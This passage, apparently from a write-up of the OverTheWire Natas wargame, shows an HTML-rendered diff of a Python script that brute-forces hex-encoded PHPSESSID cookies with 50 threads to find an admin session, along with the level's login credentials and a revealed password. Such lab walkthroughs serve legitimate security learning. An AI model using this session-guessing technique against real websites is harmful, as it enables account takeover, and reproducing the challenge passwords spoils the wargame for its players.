-    <span style="color:#007020;font-weight:bold">if</span> <span style="color:#4070a0">&#34;You are an admin.&#34;</span> <span style="color:#007020;font-weight:bold">in</span> r<span style="color:#666">.</span>text:
-        logger<span style="color:#666">.</span>info(<span style="color:#4070a0">&#34;Admin session: </span><span style="color:#70a0d0;font-style:italic">%d</span><span style="color:#4070a0">&#34;</span>, session_num)
-        <span style="color:#007020;font-weight:bold">print</span> r<span style="color:#666">.</span>text
+<span style="color:#00f">def</span> str_to_hex(string):
+    char_codes = [ord(c) <span style="color:#00f">for</span> c <span style="color:#00f">in</span> string]
+    hex_codes = [hex(c) <span style="color:#00f">for</span> c <span style="color:#00f">in</span> char_codes]
+    clean_hex_codes = [h.split(<span style="color:#a31515">&#34;0x&#34;</span>)[1] <span style="color:#00f">for</span> h <span style="color:#00f">in</span> hex_codes]
+    <span style="color:#00f">return</span> <span style="color:#a31515">&#34;&#34;</span>.join(clean_hex_codes)
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">main</span>():
-    <span style="color:#007020;font-weight:bold">with</span> concurrent<span style="color:#666">.</span>futures<span style="color:#666">.</span>ThreadPoolExecutor(max_workers<span style="color:#666">=</span><span style="color:#40a070">50</span>) <span style="color:#007020;font-weight:bold">as</span> executor:
-        executor<span style="color:#666">.</span>map(get_page_text, <span style="color:#007020">range</span>(<span style="color:#40a070">640</span>))
+<span style="color:#00f">def</span> get_page_text(session_num):
+    logger.debug(session_num)
+    encoded_session_num = str_to_hex(<span style="color:#a31515">&#34;-&#34;</span>.join([str(session_num), <span style="color:#a31515">&#34;admin&#34;</span>]))
+    r = requests.get(
+        <span style="color:#a31515">&#34;http://natas19.natas.labs.overthewire.org&#34;</span>,
+        auth=(<span style="color:#a31515">&#34;natas19&#34;</span>, <span style="color:#a31515">&#34;4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs&#34;</span>),
+        cookies={<span style="color:#a31515">&#34;PHPSESSID&#34;</span>: str(encoded_session_num)})
+    <span style="color:#00f">if</span> <span style="color:#a31515">&#34;You are an admin.&#34;</span> <span style="color:#00f">in</span> r.text:
+        logger.info(<span style="color:#a31515">&#34;Admin session: </span><span style="color:#a31515">%d</span><span style="color:#a31515">&#34;</span>, session_num)
+        <span style="color:#00f">print</span> r.text
 
 
-<span style="color:#007020;font-weight:bold">if</span> __name__ <span style="color:#666">==</span> <span style="color:#4070a0">&#34;__main__&#34;</span>:
+<span style="color:#00f">def</span> main():
+    <span style="color:#00f">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=50) <span style="color:#00f">as</span> executor:
+        executor.map(get_page_text, range(640))
+
+
+<span style="color:#00f">if</span> __name__ == <span style="color:#a31515">&#34;__main__&#34;</span>:
     main()</code></pre></div>
 <p><code>eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</code></p>
 <div class="footnotes">
